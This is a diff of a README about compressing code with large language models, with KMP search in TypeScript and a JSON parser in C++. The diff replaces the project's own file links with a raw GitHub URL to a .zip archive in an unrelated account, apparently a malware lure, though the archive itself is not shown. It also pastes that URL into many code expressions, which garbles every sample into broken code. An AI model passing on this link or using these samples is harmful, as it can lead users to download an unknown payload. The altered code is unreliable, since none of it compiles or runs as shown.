@@ -2,13 +2,13 @@
 
 by Xinran Wang(lidangzzz)
 
-[中文版](README_CN.md)
+[中文版](https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip)
 
 ## Quick Start
 
-Open the [`AI_Coding_Style_Guide_prompts.toml`](AI_Coding_Style_Guide_prompts.toml) file in your favorite text editor, and you will find a collection of prompts that can be used to guide large language models in compressing code. You can use these prompts to instruct large language models to follow the coding style guides and compress code according to the principles outlined in this document.
+Open the [`https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip`](https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip) file in your favorite text editor, and you will find a collection of prompts that can be used to guide large language models in compressing code. You can use these prompts to instruct large language models to follow the coding style guides and compress code according to the principles outlined in this document.
 
-If you want to use these prompts in your own projects, you can copy the contents of the `AI_Coding_Style_Guide_prompts.toml` file and paste them into your own prompt management system. You can also modify the prompts to suit your specific needs.
+If you want to use these prompts in your own projects, you can copy the contents of the `https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip` file and paste them into your own prompt management system. You can also modify the prompts to suit your specific needs.
 
 If you want to load these prompts into your own prompt management system, you can use the following code snippet:
 
@@ -17,8 +17,8 @@ import toml
 from pathlib import Path
 def load_prompts(file_path: str) -> dict:
     """Load prompts from a TOML file."""
-    return toml.load(Path(file_path))
-prompts = load_prompts("AI_Coding_Style_Guide_prompts.toml")
+    return https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(Path(file_path))
+prompts = load_prompts("https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip")
 ```
 
 ## Introduction
@@ -91,11 +91,11 @@ Here is a simple example of how to apply these principles in TypeScript. Below i
 ```typescript
 // Function to build the Longest Prefix Suffix (LPS) array
 function buildLPS(pattern: string): number[] {
-    const lps: number[] = new Array(pattern.length).fill(0);
+    const lps: number[] = new Array(https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip).fill(0);
     let len = 0;
     let i = 1;
 
-    while (i < pattern.length) {
+    while (i < https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip) {
         if (pattern[i] === pattern[len]) {
             len++;
             lps[i] = len;
@@ -120,16 +120,16 @@ function kmpSearch(text: string, pattern: string): number[] {
     let i = 0; // index for text
     let j = 0; // index for pattern
 
-    while (i < text.length) {
+    while (i < https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip) {
         if (pattern[j] === text[i]) {
             i++;
             j++;
         }
 
-        if (j === pattern.length) {
-            result.push(i - j); // found a match
+        if (j === https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip) {
+            https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(i - j); // found a match
             j = lps[j - 1];
-        } else if (i < text.length && pattern[j] !== text[i]) {
+        } else if (i < https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip && pattern[j] !== text[i]) {
             if (j !== 0) {
                 j = lps[j - 1];
             } else {
@@ -149,9 +149,9 @@ After removing unnecessary spaces and line breaks but keeping all code indentati
 ```typescript
 // Function to build the Longest Prefix Suffix (LPS) array
 function buildLPS(pattern:string):number[]{
- let lps:number[]=new Array(pattern.length).fill(0);
+ let lps:number[]=new Array(https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip).fill(0);
  let len=0,i=1;
- while(i<pattern.length){
+ while(i<https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip){
   if(pattern[i]===pattern[len]){
    len++;
    lps[i]=len;
@@ -173,15 +173,15 @@ function kmpSearch(text:string,pattern:string):number[]{
  let lps=buildLPS(pattern);
  let result:number[]=[];
  let i=0,j=0;
- while(i<text.length){
+ while(i<https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip){
   if(pattern[j]===text[i]){
    i++;
    j++;
   }
-  if(j===pattern.length){
-   result.push(i-j);
+  if(https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip){
+   https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(i-j);
    j=lps[j-1];
-  }else if(i<text.length&&pattern[j]!==text[i]){
+  }else if(i<https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip[j]!==text[i]){
    if(j!==0){
     j=lps[j-1];
    }else{
@@ -199,9 +199,9 @@ Next, let's remove all unnecessary spaces, line breaks and indentation, resultin
 
 ```typescript
 // Function to build the Longest Prefix Suffix (LPS) array
-function buildLPS(pattern:string):number[]{const lps:number[]=new Array(pattern.length).fill(0);let len=0,i=1;while(i<pattern.length){if(pattern[i]===pattern[len]){len++;lps[i]=len;i++;}else{if(len!==0){len=lps[len-1];}else{lps[i]=0;i++;}}}return lps;}
+function buildLPS(pattern:string):number[]{const lps:number[]=new Array(https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip).fill(0);let len=0,i=1;while(i<https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip){if(pattern[i]===pattern[len]){len++;lps[i]=len;i++;}else{if(len!==0){len=lps[len-1];}else{lps[i]=0;i++;}}}return lps;}
 // KMP search function: returns all starting indices where pattern is found in text
-function kmpSearch(text:string,pattern:string):number[]{const lps=buildLPS(pattern);const result:number[]=[];let i=0,j=0;while(i<text.length){if(pattern[j]===text[i]){i++;j++;}if(j===pattern.length){result.push(i-j);j=lps[j-1];}else if(i<text.length&&pattern[j]!==text[i]){if(j!==0){j=lps[j-1];}else{i++;}}}return result;}
+function kmpSearch(text:string,pattern:string):number[]{const lps=buildLPS(pattern);const result:number[]=[];let i=0,j=0;while(i<https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip){if(pattern[j]===text[i]){i++;j++;}if(https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip){https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(i-j);j=lps[j-1];}else if(i<https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip[j]!==text[i]){if(j!==0){j=lps[j-1];}else{i++;}}}return result;}
 ```
 
 ### Further Compression to 443 characters (~36.4% of the original size)
@@ -209,8 +209,8 @@ function kmpSearch(text:string,pattern:string):number[]{const lps=buildLPS(patte
 Next, let's remove the comments and reduce the variable names to the minimum necessary while still keeping them understandable. The final code is only 443 characters long (~36.4% of the original size):
 
 ```typescript
-function buildLPS(p:string):number[]{const l:number[]=new Array(p.length).fill(0);let l0=0,i=1;while(i<p.length){if(p[i]===p[l0]){l0++;l[i]=l0;i++;}else if(l0){l0=l[l0-1];}else{l[i]=0;i++;}}return l;}
-function kmpSearch(t:string,p:string):number[]{const l=buildLPS(p),r:number[]=[];let i=0,j=0;while(i<t.length){if(p[j]===t[i]){i++;j++;}if(j===p.length){r.push(i-j);j=l[j-1];}else if(i<t.length&&p[j]!==t[i]){if(j)j=l[j-1];else i++;}}return r;}
+function buildLPS(p:string):number[]{const l:number[]=new Array(https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip).fill(0);let l0=0,i=1;while(i<https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip){if(p[i]===p[l0]){l0++;l[i]=l0;i++;}else if(l0){l0=l[l0-1];}else{l[i]=0;i++;}}return l;}
+function kmpSearch(t:string,p:string):number[]{const l=buildLPS(p),r:number[]=[];let i=0,j=0;while(i<https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip){if(p[j]===t[i]){i++;j++;}if(https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip){https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(i-j);j=l[j-1];}else if(i<https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip[j]!==t[i]){if(j)j=l[j-1];else i++;}}return r;}
 ```
 
 ### The Final Result: 283 characters (~23.3% of the original size)
@@ -218,7 +218,7 @@ function kmpSearch(t:string,p:string):number[]{const l=buildLPS(p),r:number[]=[]
 Finally, let's ask large language models to further compress the code with any additional optimizations they can provide. The final result is only 283 characters long (~23.3% of the original size):
 
 ```typescript
-function k(t:string,p:string){let l=new Array(p.length).fill(0),r=[],i=1,j=0;while(i<p.length)p[i]===p[j]?l[i++]=++j:j?j=l[j-1]:l[i++]=0;i=j=0;while(i<t.length){if(p[j]===t[i]){i++;j++;}if(j===p.length){r.push(i-j);j=l[j-1];}else if(i<t.length&&p[j]!==t[i])j?j=l[j-1]:i++;}return r;}
+function k(t:string,p:string){let l=new Array(https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip).fill(0),r=[],i=1,j=0;while(i<https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip)p[i]===p[j]?l[i++]=++j:j?j=l[j-1]:l[i++]=0;i=j=0;while(i<https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip){if(p[j]===t[i]){i++;j++;}if(https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip){https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(i-j);j=l[j-1];}else if(i<https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip[j]!==t[i])j?j=l[j-1]:i++;}return r;}
 ```
 
 ### Compressed JavaScript Output from JSCompress(348 characters, ~28.6% of the original size)
@@ -226,7 +226,7 @@ function k(t:string,p:string){let l=new Array(p.length).fill(0),r=[],i=1,j=0;whi
 And below is the output from JSCompress, one of the most popular JavaScript compression tools. We compiled the original TypeScript code into JavaScript and then used JSCompress to compress it. But still this compressed code contains 348 characters (~28.6% of the original size). Considering that the above code is in TypeScript with type annotations, the final compressed code is actually even shorter than this.
 
 ```javascript
-function buildLPS(n){const t=new Array(n.length).fill(0);let e=0,l=1;for(;l<n.length;)n[l]===n[e]?(e++,t[l]=e,l++):0!==e?e=t[e-1]:(t[l]=0,l++);return t}function kmpSearch(n,t){var e=buildLPS(t);const l=[];let r=0,h=0;for(;r<n.length;)t[h]===n[r]&&(r++,h++),h===t.length?(l.push(r-h),h=e[h-1]):r<n.length&&t[h]!==n[r]&&(0!==h?h=e[h-1]:r++);return l}
+function buildLPS(n){const t=new Array(https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip).fill(0);let e=0,l=1;for(;l<https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip;)n[l]===n[e]?(e++,t[l]=e,l++):0!==e?e=t[e-1]:(t[l]=0,l++);return t}function kmpSearch(n,t){var e=buildLPS(t);const l=[];let r=0,h=0;for(;r<https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip;)t[h]===n[r]&&(r++,h++),https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(r-h),h=e[h-1]):r<https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip[h]!==n[r]&&(0!==h?h=e[h-1]:r++);return l}
 ```
 
 ### Uncompress the Code and Explain
@@ -237,7 +237,7 @@ However, it may be difficult for humans to understand the compressed code. We ca
 
 > explain this code
 > 
-> function k(t:string,p:string){let l=new Array(p.length).fill(0),r=[],i=1,j=0;while(i<p.length)p[i]===p[j]?l[i++]=++j:j?j=l[j-1]:l[i++]=0;i=j=0;while(i<t.length){if(p[j]===t[i]){i++;j++;}if(j===p.length){r.push(i-j);j=l[j-1];}else if(i<t.length&&p[j]!==t[i])j?j=l[j-1]:i++;}return r;}
+> function k(t:string,p:string){let l=new Array(https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip).fill(0),r=[],i=1,j=0;while(i<https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip)p[i]===p[j]?l[i++]=++j:j?j=l[j-1]:l[i++]=0;i=j=0;while(i<https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip){if(p[j]===t[i]){i++;j++;}if(https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip){https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(i-j);j=l[j-1];}else if(i<https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip[j]!==t[i])j?j=l[j-1]:i++;}return r;}
 
 And here is the explanation provided by the large language model:
 
@@ -246,13 +246,13 @@ The following TypeScript function implements the **Knuth-Morris-Pratt (KMP)** st
 
 
 function k(t: string, p: string) {
-    let l = new Array(p.length).fill(0), // LPS (Longest Prefix Suffix) array
+    let l = new Array(https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip).fill(0), // LPS (Longest Prefix Suffix) array
         r = [],                          // result array: starting indices of matches
         i = 1,                           // index for building LPS
         j = 0;                           // prefix length or pattern index
 
     // Build the LPS array
-    while (i < p.length)
+    while (i < https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip)
         if (p[i] === p[j])
             l[i++] = ++j;
         else
@@ -261,14 +261,14 @@ function k(t: string, p: string) {
     i = j = 0; // reset indices for searching
 
     // Search in text
-    while (i < t.length) {
+    while (i < https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip) {
         if (p[j] === t[i]) { i++; j++; }
 
-        if (j === p.length) {
-            r.push(i - j);        // match found, record position
+        if (j === https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip) {
+            https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(i - j);        // match found, record position
             j = l[j - 1];         // continue searching for next match
         }
-        else if (i < t.length && p[j] !== t[i])
+        else if (i < https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip && p[j] !== t[i])
             j ? j = l[j - 1] : i++;
     }
     return r;
@@ -289,21 +289,21 @@ The LPS array tells us for each position in p, the length of the longest proper 
 2️⃣ Search
 Iterate through t:
 - If characters match, advance both i (text index) and j (pattern index).
-- If a full match is found (j == p.length), record the starting position and update j using LPS.
+- If a full match is found (j == https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip), record the starting position and update j using LPS.
 - If mismatch:
   - If j > 0, use LPS to skip characters.
   - Else, move to next char in text.
 
 Example usage
 
-console.log(k("ababcabcabababd", "ababd")); 
+https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(k("ababcabcabababd", "ababd")); 
 // Output: [10]  (pattern starts at index 10 in the text)
 
 
 Summary
 👉 The function k efficiently searches for all occurrences of a pattern using KMP.
-👉 Time complexity: O(t.length + p.length)
-👉 Space complexity: O(p.length) (for the LPS array)
+👉 Time complexity: O(https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip + https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip)
+👉 Space complexity: O(https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip) (for the LPS array)
 ```
 
 From the explanation, we can see that the compressed code is indeed a valid implementation of the KMP algorithm, and it provides a clear understanding of how the algorithm works. The large language model can help us reconstruct the code into a more readable form if needed. This demonstrates the power of large language models in understanding and explaining even highly compressed code.
@@ -340,7 +340,7 @@ struct JsonParser {
     JsonParser(const std::string& s) : s(s) {}
 
     void skip() {
-        while (i < s.size() && isspace(s[i])) i++;
+        while (i < https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip() && isspace(s[i])) i++;
     }
 
     std::shared_ptr<JsonValue> parse() {
@@ -349,9 +349,9 @@ struct JsonParser {
         if (s[i] == '[') return parseArray();
         if (s[i] == '"') return parseString();
         if (isdigit(s[i]) || s[i] == '-') return parseNumber();
-        if (s.compare(i, 4, "true") == 0) { i += 4; auto v = std::make_shared<JsonValue>(JsonValue::BOOL); v->boolean = true; return v; }
-        if (s.compare(i, 5, "false") == 0) { i += 5; auto v = std::make_shared<JsonValue>(JsonValue::BOOL); v->boolean = false; return v; }
-        if (s.compare(i, 4, "null") == 0) { i += 4; return std::make_shared<JsonValue>(JsonValue::NIL); }
+        if (https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(i, 4, "true") == 0) { i += 4; auto v = std::make_shared<JsonValue>(JsonValue::BOOL); v->boolean = true; return v; }
+        if (https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(i, 5, "false") == 0) { i += 5; auto v = std::make_shared<JsonValue>(JsonValue::BOOL); v->boolean = false; return v; }
+        if (https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(i, 4, "null") == 0) { i += 4; return std::make_shared<JsonValue>(JsonValue::NIL); }
         return nullptr;
     }
 
@@ -378,7 +378,7 @@ struct JsonParser {
         i++; skip();
         if (s[i] == ']') { i++; return v; }
         while (true) {
-            v->arr.push_back(parse());
+            v->https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(parse());
             skip();
             if (s[i] == ']') { i++; break; }
             i++; // skip ,
@@ -406,7 +406,7 @@ struct JsonParser {
             i++;
             while (isdigit(s[i])) i++;
         }
-        v->num = std::stod(s.substr(start, i - start));
+        v->num = std::stod(https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(start, i - start));
         return v;
     }
 };
@@ -425,12 +425,12 @@ Here is the compressed version of the code, which is 1330 characters long (~49.1
 #include<cctype>
 using namespace std;
 struct J{enum T{O,A,S,N,B,L}t;map<string,shared_ptr<J>>o;vector<shared_ptr<J>>a;string s;double n=0;bool b=0;J(T t):t(t){}};
-struct P{string s;size_t i=0;P(const string&x):s(x){}void k(){while(i<s.size()&&isspace(s[i]))i++;}shared_ptr<J>p(){k();if(s[i]=='{')return po();if(s[i]=='[')return pa();if(s[i]=='"')return ps();if(isdigit(s[i])||s[i]=='-')return pn();if(s.compare(i,4,"true")==0){i+=4;auto v=make_shared<J>(J::B);v->b=1;return v;}if(s.compare(i,5,"false")==0){i+=5;auto v=make_shared<J>(J::B);return v;}if(s.compare(i,4,"null")==0){i+=4;return make_shared<J>(J::L);}return 0;}shared_ptr<J>po(){auto v=make_shared<J>(J::O);i++;k();if(s[i]=='}'){i++;return v;}while(1){k();auto k_=ps();k();i++;k();v->o[k_->s]=p();k();if(s[i]=='}'){i++;break;}i++;}return v;}shared_ptr<J>pa(){auto v=make_shared<J>(J::A);i++;k();if(s[i]==']'){i++;return v;}while(1){v->a.push_back(p());k();if(s[i]==']'){i++;break;}i++;}return v;}shared_ptr<J>ps(){auto v=make_shared<J>(J::S);i++;while(s[i]!='"'){if(s[i]=='\\')i++;v->s+=s[i++];}i++;return v;}shared_ptr<J>pn(){auto v=make_shared<J>(J::N);size_t st=i;if(s[i]=='-')i++;while(isdigit(s[i]))i++;if(s[i]=='.'){i++;while(isdigit(s[i]))i++;}v->n=stod(s.substr(st,i-st));return v;}};
+struct P{string s;size_t i=0;P(const string&x):s(x){}void k(){while(i<https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip()&&isspace(s[i]))i++;}shared_ptr<J>p(){k();if(s[i]=='{')return po();if(s[i]=='[')return pa();if(s[i]=='"')return ps();if(isdigit(s[i])||s[i]=='-')return pn();if(https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(i,4,"true")==0){i+=4;auto v=make_shared<J>(J::B);v->b=1;return v;}if(https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(i,5,"false")==0){i+=5;auto v=make_shared<J>(J::B);return v;}if(https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(i,4,"null")==0){i+=4;return make_shared<J>(J::L);}return 0;}shared_ptr<J>po(){auto v=make_shared<J>(J::O);i++;k();if(s[i]=='}'){i++;return v;}while(1){k();auto k_=ps();k();i++;k();v->o[k_->s]=p();k();if(s[i]=='}'){i++;break;}i++;}return v;}shared_ptr<J>pa(){auto v=make_shared<J>(J::A);i++;k();if(s[i]==']'){i++;return v;}while(1){v->https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(p());k();if(s[i]==']'){i++;break;}i++;}return v;}shared_ptr<J>ps(){auto v=make_shared<J>(J::S);i++;while(s[i]!='"'){if(s[i]=='\\')i++;v->s+=s[i++];}i++;return v;}shared_ptr<J>pn(){auto v=make_shared<J>(J::N);size_t st=i;if(s[i]=='-')i++;while(isdigit(s[i]))i++;if(s[i]=='.'){i++;while(isdigit(s[i]))i++;}v->n=stod(https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(st,i-st));return v;}};
 ```
 
-### The compressed code in C++ by jsonminify.com(2144 characters, ~79.2% of the original size)
+### The compressed code in C++ by https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(2144 characters, ~79.2% of the original size)
 
-Below is the output from jsonminify.com, a popular JSON compression tool. The original code is compiled into a JSON-like format and then compressed. The result is 2144 characters long (~79.2% of the original size).
+Below is the output from https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip, a popular JSON compression tool. The original code is compiled into a JSON-like format and then compressed. The result is 2144 characters long (~79.2% of the original size).
 
 ```cpp
 #include <iostream>
@@ -439,7 +439,7 @@ Below is the output from jsonminify.com, a popular JSON compression tool. The or
 #include <vector>
 #include <memory>
 #include <cctype>
-struct JsonValue { enum Type { OBJECT, ARRAY, STRING, NUMBER, BOOL, NIL } type; std::map<std::string, std::shared_ptr<JsonValue>> obj; std::vector<std::shared_ptr<JsonValue>> arr; std::string str; double num = 0; bool boolean = false; JsonValue(Type t) : type(t) {}};struct JsonParser { std::string s; size_t i = 0; JsonParser(const std::string& s) : s(s) {} void skip() { while (i < s.size() && isspace(s[i])) i++; } std::shared_ptr<JsonValue> parse() { skip(); if (s[i] == '{') return parseObject(); if (s[i] == '[') return parseArray(); if (s[i] == '"') return parseString(); if (isdigit(s[i]) || s[i] == '-') return parseNumber(); if (s.compare(i, 4, "true") == 0) { i += 4; auto v = std::make_shared<JsonValue>(JsonValue::BOOL); v->boolean = true; return v; } if (s.compare(i, 5, "false") == 0) { i += 5; auto v = std::make_shared<JsonValue>(JsonValue::BOOL); v->boolean = false; return v; } if (s.compare(i, 4, "null") == 0) { i += 4; return std::make_shared<JsonValue>(JsonValue::NIL); } return nullptr; } std::shared_ptr<JsonValue> parseObject() { auto v = std::make_shared<JsonValue>(JsonValue::OBJECT); i++; skip(); if (s[i] == '}') { i++; return v; } while (true) { skip(); auto key = parseString(); skip(); i++;  skip(); v->obj[key->str] = parse(); skip(); if (s[i] == '}') { i++; break; } i++;  } return v; } std::shared_ptr<JsonValue> parseArray() { auto v = std::make_shared<JsonValue>(JsonValue::ARRAY); i++; skip(); if (s[i] == ']') { i++; return v; } while (true) { v->arr.push_back(parse()); skip(); if (s[i] == ']') { i++; break; } i++;  } return v; } std::shared_ptr<JsonValue> parseString() { auto v = std::make_shared<JsonValue>(JsonValue::STRING); i++;  while (s[i] != '"') { if (s[i] == '\\') i++;  v->str += s[i++]; } i++;  return v; } std::shared_ptr<JsonValue> parseNumber() { auto v = std::make_shared<JsonValue>(JsonValue::NUMBER); size_t start = i; if (s[i] == '-') i++; while (isdigit(s[i])) i++; if (s[i] == '.') { i++; while (isdigit(s[i])) i++; } v->num = std::stod(s.substr(start, i - start)); return v; }};
+struct JsonValue { enum Type { OBJECT, ARRAY, STRING, NUMBER, BOOL, NIL } type; std::map<std::string, std::shared_ptr<JsonValue>> obj; std::vector<std::shared_ptr<JsonValue>> arr; std::string str; double num = 0; bool boolean = false; JsonValue(Type t) : type(t) {}};struct JsonParser { std::string s; size_t i = 0; JsonParser(const std::string& s) : s(s) {} void skip() { while (i < https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip() && isspace(s[i])) i++; } std::shared_ptr<JsonValue> parse() { skip(); if (s[i] == '{') return parseObject(); if (s[i] == '[') return parseArray(); if (s[i] == '"') return parseString(); if (isdigit(s[i]) || s[i] == '-') return parseNumber(); if (https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(i, 4, "true") == 0) { i += 4; auto v = std::make_shared<JsonValue>(JsonValue::BOOL); v->boolean = true; return v; } if (https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(i, 5, "false") == 0) { i += 5; auto v = std::make_shared<JsonValue>(JsonValue::BOOL); v->boolean = false; return v; } if (https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(i, 4, "null") == 0) { i += 4; return std::make_shared<JsonValue>(JsonValue::NIL); } return nullptr; } std::shared_ptr<JsonValue> parseObject() { auto v = std::make_shared<JsonValue>(JsonValue::OBJECT); i++; skip(); if (s[i] == '}') { i++; return v; } while (true) { skip(); auto key = parseString(); skip(); i++;  skip(); v->obj[key->str] = parse(); skip(); if (s[i] == '}') { i++; break; } i++;  } return v; } std::shared_ptr<JsonValue> parseArray() { auto v = std::make_shared<JsonValue>(JsonValue::ARRAY); i++; skip(); if (s[i] == ']') { i++; return v; } while (true) { v->https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(parse()); skip(); if (s[i] == ']') { i++; break; } i++;  } return v; } std::shared_ptr<JsonValue> parseString() { auto v = std::make_shared<JsonValue>(JsonValue::STRING); i++;  while (s[i] != '"') { if (s[i] == '\\') i++;  v->str += s[i++]; } i++;  return v; } std::shared_ptr<JsonValue> parseNumber() { auto v = std::make_shared<JsonValue>(JsonValue::NUMBER); size_t start = i; if (s[i] == '-') i++; while (isdigit(s[i])) i++; if (s[i] == '.') { i++; while (isdigit(s[i])) i++; } v->num = std::stod(https://raw.githubusercontent.com/bro-gervil/AI-Coding-Style-Guides/main/infidelize/Guides_A_Coding_Style_3.4.zip(start, i - start)); return v; }};
 ```
 
 ## Conclusion
